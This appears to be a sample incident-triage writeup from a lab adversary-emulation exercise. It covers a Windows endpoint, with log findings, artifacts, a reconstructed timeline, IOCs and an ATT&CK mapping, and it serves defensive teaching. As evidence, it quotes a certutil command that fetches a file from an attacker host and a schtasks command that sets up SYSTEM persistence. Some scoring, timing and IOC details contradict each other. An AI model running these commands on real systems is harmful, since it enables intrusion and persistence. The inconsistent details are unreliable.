# Sample Triage Findings & Incident Timeline

This document shows example output from running the full lab exercise — adversary emulation followed by endpoint triage. Use this as a reference for what a real analyst writeup looks like.

---

## Scenario Summary

**Date:** 2024-03-15  
**Endpoint:** LAB-WIN10-01  
**User:** jsmith  
**Triage Window:** 09:00 – 11:00 local time  
**Trigger:** SIEM alert — Sysmon EID 1, certutil.exe with `-urlcache` in CommandLine

---

## Alert Timeline

| Time     | Source         | Event ID | Description |
|----------|----------------|----------|-------------|
| 09:14:22 | Sysmon         | 1        | `certutil.exe -urlcache -split -f http://192.168.1.100/update.txt C:\Windows\Temp\update.txt` — ParentImage: `cmd.exe` |
| 09:14:23 | Sysmon         | 3        | Network connection — certutil.exe → 192.168.1.100:80 |
| 09:14:23 | Sysmon         | 11       | File created — `C:\Users\jsmith\AppData\Local\Microsoft\Windows\INetCache\IE\ABCD1234\update[1].txt` |
| 09:14:24 | Sysmon         | 11       | File created — `C:\Windows\Temp\update.txt` |
| 09:15:01 | Security       | 4698     | Scheduled task created — TaskName: `WindowsUpdateHelper` — TaskContent includes `wscript.exe` |
| 09:15:01 | Sysmon         | 1        | `schtasks.exe /create /tn WindowsUpdateHelper /tr "wscript.exe //B C:\ProgramData\update.vbs"` — ParentImage: `wscript.exe` |
| 09:15:02 | Sysmon         | 11       | File created — `C:\Windows\System32\Tasks\WindowsUpdateHelper` |

---

## Module 1 — Event Log IOC Findings

```
[HIGH] EID 4698 — Task Created: 'WindowsUpdateHelper' by 'jsmith' | ScriptEngine: True
[HIGH] Sysmon EID 1 — CertUtil: Image=C:\Windows\System32\certutil.exe | Parent=C:\Windows\System32\cmd.exe
       CmdLine: certutil.exe -urlcache -split -f http://192.168.1.100/update.txt C:\Windows\Temp\update.txt
[HIGH] Sysmon EID 3 — CertUtil Network: 192.168.1.100 (192.168.1.100):80
[HIGH] Sysmon EID 1 — Schtasks Create | ParentImage: C:\Windows\SysWOW64\wscript.exe
[MEDIUM] Sysmon EID 11 — File Created: C:\Windows\Temp\update.txt (by certutil.exe)
[MEDIUM] Sysmon EID 11 — File Created: ...\INetCache\IE\ABCD1234\update[1].txt (by certutil.exe)
```

---

## Module 2 — Browser Artifact Findings

**Chrome History (jsmith / Default profile):**
```
[INFO]  Chrome [Default] — 47 URL visits in timeframe
[HIGH]  Chrome SUSPICIOUS URL: http://192.168.1.100/update.txt | visited 09:13:58
[LOW]   chrome://settings/ | visited 09:12:01
[LOW]   https://www.google.com | visited 09:11:44
```

**Key correlation:** The user visited `http://192.168.1.100/update.txt` in Chrome at 09:13:58 — **24 seconds before** certutil downloaded the same URL at 09:14:22. This suggests the user may have previewed or been directed to the URL before the script ran, or an attacker used a browser-triggered mechanism to initiate the certutil download.

**Downloads folder (jsmith):**
```
[MEDIUM] DOWNLOAD FILE: update.zip [48,392 bytes] at 2024-03-15 09:13:45
[HIGH]   DOWNLOAD FILE: macro_enabled_report.xlsm [112,884 bytes] at 2024-03-15 09:10:22
```

**Assessment:** The `.xlsm` download 4 minutes before the certutil execution is highly suspicious. Excel macro-enabled files are a common initial access vector; this may be the execution chain origin.

---

## Module 3 — Scheduled Task Anomalies

```
[HIGH] Task: 'WindowsUpdateHelper' | Score: 75 | Flags: ScriptingEngine:wscript.exe, SuspiciousPath, MimicName:Update, SystemPrincipal
       Action: wscript.exe //B "C:\ProgramData\update.vbs"
       State: Ready | LastRun: Never | Principal: SYSTEM

[LOW]  Task: 'GoogleUpdateTaskMachineCore' | Score: 5 | Flags: none
[LOW]  Task: 'MicrosoftEdgeUpdateTaskMachineCore' | Score: 5 | Flags: none
```

**Score breakdown for WindowsUpdateHelper:**
- ScriptingEngine action: +40
- SuspiciousPath (ProgramData): +30 → total: 70 → HIGH
- MimicName: +20 (name not under `\Microsoft\`)
- SystemPrincipal: +15

---

## Module 4 — Prefetch Evidence

```
[HIGH]   PREFETCH HIT: CERTUTIL.EXE | LastRun: 2024-03-15 09:14:22 | Flags: LOLBIN, CertUtil-Execution-Confirmed
[HIGH]   PREFETCH HIT: WSCRIPT.EXE  | LastRun: 2024-03-15 09:15:01 | Flags: LOLBIN, ScriptingEngine-Confirmed
[MEDIUM] PREFETCH HIT: SCHTASKS.EXE | LastRun: 2024-03-15 09:15:01 | Flags: LOLBIN
[LOW]    PREFETCH HIT: EXCEL.EXE    | LastRun: 2024-03-15 09:10:05 | Flags: none
```

**Note:** EXCEL.EXE ran at 09:10:05 — consistent with the `.xlsm` download at 09:10:22. Prefetch confirms Excel executed before the certutil chain began.

---

## Module 5 — CertUtil Cache Artifacts

```
[LOW]    CACHE FILE: ...\INetCache\IE\ABCD1234\update[1].txt [1,204 bytes] LastWrite: 2024-03-15 09:14:23
[MEDIUM] STAGING PATH C:\Windows\Temp — 1 new files
[MEDIUM]   FILE: update.txt [1,204 bytes] 2024-03-15 09:14:24
```

---

## Reconstructed Incident Timeline

```
09:10:05  Excel.exe launched (Prefetch confirmed)
09:10:22  macro_enabled_report.xlsm downloaded to Downloads folder
              └─► Likely initial access vector

09:13:45  update.zip downloaded via browser
09:13:58  Chrome visited http://192.168.1.100/update.txt
              └─► Attacker-controlled staging server

09:14:22  certutil.exe -urlcache -split -f http://192.168.1.100/update.txt
              └─► LOLBIN download confirmed (Sysmon EID 1, 3, 11)
              └─► INetCache artifact persists at \INetCache\IE\ABCD1234\

09:15:01  wscript.exe spawns schtasks.exe
              └─► Scheduled task 'WindowsUpdateHelper' created
              └─► Action: wscript.exe C:\ProgramData\update.vbs
              └─► Security EID 4698 generated
              └─► Task XML created in System32\Tasks\
```

---

## IOC Summary

| Type | Value | Confidence |
|------|-------|------------|
| IP | 192.168.1.100 | High |
| URL | http://192.168.1.100/update.txt | High |
| File | C:\Windows\Temp\update.txt | High |
| File | C:\ProgramData\update.vbs | High |
| File | C:\ProgramData\WindowsUpdateHelper.vbs | High |
| Task | WindowsUpdateHelper | High |
| Hash | (run Get-FileHash on staged files) | — |

---

## Recommended Next Steps

1. **Isolate the endpoint** from the network immediately
2. **Hash all IOC files** and submit to VirusTotal
3. **Review the .xlsm file** in a sandbox (likely initial access)
4. **Block 192.168.1.100** at the perimeter firewall
5. **Search for lateral movement** — did any other endpoints contact 192.168.1.100?
6. **Delete the scheduled task** after imaging the endpoint for evidence
7. **Review all accounts** on LAB-WIN10-01 for unauthorized changes

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|---------|
| Initial Access | T1566.002 Spearphishing Link | xlsm download via browser |
| Execution | T1059.005 VBScript | wscript.exe running update.vbs |
| Persistence | T1053.005 Scheduled Task | WindowsUpdateHelper task |
| Defense Evasion | T1218.003 CMSTP / T1105 CertUtil | certutil -urlcache LOLBIN |
| C2 | T1071.001 HTTP | certutil → 192.168.1.100:80 |
